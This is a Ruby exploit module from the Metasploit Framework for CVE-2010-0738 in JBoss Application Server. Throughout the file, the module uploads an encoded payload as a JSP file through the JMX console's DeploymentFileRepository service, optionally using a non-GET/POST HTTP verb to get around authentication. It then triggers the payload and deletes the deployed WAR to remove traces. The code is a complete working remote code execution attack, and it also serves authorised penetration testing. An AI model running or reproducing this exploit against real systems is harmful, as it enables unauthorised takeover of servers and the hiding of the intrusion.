##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'JBoss Java Class DeploymentFileRepository WAR Deployment',
			'Description' => %q{
					This module uses the DeploymentFileRepository class in
				JBoss Application Server (jbossas) to deploy a JSP file
				in a minimal WAR context.
			},
			'Author'      => [ 'MC', 'Jacob Giannantonio', 'Patrick Hof' ],
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$',
			'References'  =>
				[
					[ 'CVE', '2010-0738' ], # by using VERB other than GET/POST
					[ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
				],
			'Privileged'  => false,
			'Platform'    => ['linux', 'windows' ],
			'Targets'     =>
				[
					[ 'Universal',
						{
							'Arch' => ARCH_JAVA,
							'Payload' =>
								{
									'DisableNops' => true,
								},
						}
					],
				],
			'DisclosureDate' => "Apr 26 2010",
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('SHELL', [ true, "The system shell to use.", 'automatic']),
				OptString.new('JSP',   [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
				OptString.new('APPBASE', [ false, 'Application base name, (default: random)', nil ]),
				OptString.new('PATH',  [ true,  'The URI path of the JMX console', '/jmx-console' ]),
				OptString.new('VERB',  [ true, "The HTTP verb to use", "POST"]),
			], self.class)
	end

	def exploit
		jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))
		app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))

		p = payload
		if datastore['SHELL'] == 'automatic'
			if not (plat = detect_platform())
				fail_with(Exploit::Failure::NoTarget, 'Unable to detect platform!')
			end

			case plat
			when 'linux'
				datastore['SHELL'] = '/bin/sh'
			when 'win'
				datastore['SHELL'] = 'cmd.exe'
			end

			print_status("SHELL set to #{datastore['SHELL']}")

			return if ((p = exploit_regenerate_payload(plat, target_arch)) == nil)
		end


		#
		# UPLOAD
		#
		data =  'action=invokeOpByName'
		data << '&name=jboss.admin%3Aservice%3DDeploymentFileRepository'
		data << '&methodName=store'
		data << '&argType=java.lang.String'
		data << '&arg0=' + Rex::Text.uri_encode(app_base) + '.war'
		data << '&argType=java.lang.String'
		data << '&arg1=' + jsp_name
		data << '&argType=java.lang.String'
		data << '&arg2=.jsp'
		data << '&argType=java.lang.String'
		data << '&arg3=' + Rex::Text.uri_encode(p.encoded)
		data << '&argType=boolean'
		data << '&arg4=True'

		if (datastore['VERB'] == "POST")
			res = send_request_cgi(
				{
					'uri'    => datastore['PATH'] + '/HtmlAdaptor',
					'method' => datastore['VERB'],
					'data'   => data
				}, 5)
		else
			res = send_request_cgi(
				{
					'uri'    =>  datastore['PATH'] + '/HtmlAdaptor;index.jsp?' + data,
					'method' => datastore['VERB'],
				}, 5)
		end

		#
		# EXECUTE
		#
		# Using HEAD may trigger a 500 Internal Server Error (at leat on 4.2.3.GA),
		# but the file still gets written.
		if (res.code == 200 || res.code == 500)
			uri = '/' + app_base + '/' + jsp_name + '.jsp'
			print_status("Triggering payload at '#{uri}'...")
			verb = 'GET'
			if (datastore['VERB'] != 'GET' and datastore['VERB'] != 'POST')
				verb = 'HEAD'
			end
			# JBoss might need some time for the deployment. Try 5 times at most
			# and sleep 3 seconds in between.
			5.times do
				res = send_request_raw(
					{
						'uri'    => uri,
						'method' => verb,
					})
				if !res
					print_error("Execution failed on '#{uri}' [No Response], retrying...")
					select(nil,nil,nil,3)
				elsif (res.code < 200 or res.code >= 300)
					print_error("Execution failed on '#{uri}' [#{res.code} #{res.message}], retrying...")
					select(nil,nil,nil,3)
				elsif res.code == 200
					print_status("Successfully triggered payload at '#{uri}'.")
					break
				else
					print_error("Denied...")
				end
			end

			#
			# DELETE
			#
			# The WAR can only be removed by physically deleting it, otherwise it
			# will get redeployed after a server restart.
			print_status("Undeploying #{uri} by deleting the WAR file via DeploymentFileRepository.remove()...")
			res1 = delete_file(Rex::Text.uri_encode(app_base) + '.war', jsp_name, '.jsp')
			res2 = delete_file('./', Rex::Text.uri_encode(app_base) + '.war', '')
			[res1, res2].each do |res|
				if !res
					print_error("WARNING: Unable to remove WAR [No Response]")
				end
				if (res.code < 200 || res.code >= 300)
					print_error("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
				end
			end

			handler
		end
	end

	# Delete a file with DeploymentFileRepository.remove().
	def delete_file(folder, name, ext)
		data =  'action=invokeOpByName'
		data << '&name=jboss.admin%3Aservice%3DDeploymentFileRepository'
		data << '&methodName=remove'
		data << '&argType=java.lang.String'
		data << '&arg0=' + folder
		data << '&argType=java.lang.String'
		data << '&arg1=' + name
		data << '&argType=java.lang.String'
		data << '&arg2=' + ext

		if (datastore['VERB'] == "POST")
			res = send_request_cgi(
				{
					'uri'    => datastore['PATH'] + '/HtmlAdaptor',
					'method' => datastore['VERB'],
					'data'   => data
				}, 5)
		else
			res = send_request_cgi(
				{
					'uri'    =>  datastore['PATH'] + '/HtmlAdaptor;index.jsp?' + data,
					'method' => datastore['VERB'],
				}, 5)
		end
		res
	end

	def detect_platform
		print_status("Attempting to automatically detect the platform...")
		path = datastore['PATH'] + '/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo'
		res = send_request_raw(
			{
				'uri' => path,
			}, 20)

		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting #{path}")
			return nil
		end

		if (res.body =~ /<td.*?OSName.*?(Linux|FreeBSD|Windows).*?<\/td>/m)
			os = $1
			if (os =~ /Linux/i)
				return 'linux'
			elsif (os =~ /FreeBSD/i)
				return 'linux'
			elsif (os =~ /Windows/i)
				return 'win'
			end
		end
		nil
	end
end
